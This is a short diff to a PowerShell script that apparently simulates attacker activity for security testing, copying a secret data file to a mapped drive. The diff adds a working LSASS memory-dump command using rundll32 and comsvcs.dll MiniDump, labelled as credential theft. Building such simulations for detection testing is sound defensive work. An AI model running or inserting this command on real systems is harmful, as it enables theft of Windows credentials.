@@ -27,5 +27,8 @@ copy 'C:\Temp\secret-data.txt' 'Z:\'
 # Exit remote device
 Exit-PSSession
 
+# Attempt credential theft
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full
+
 # Prevent the PowerShell window from closing immediately - for visibility in testing
 Read-Host -Prompt "Press Enter to exit"
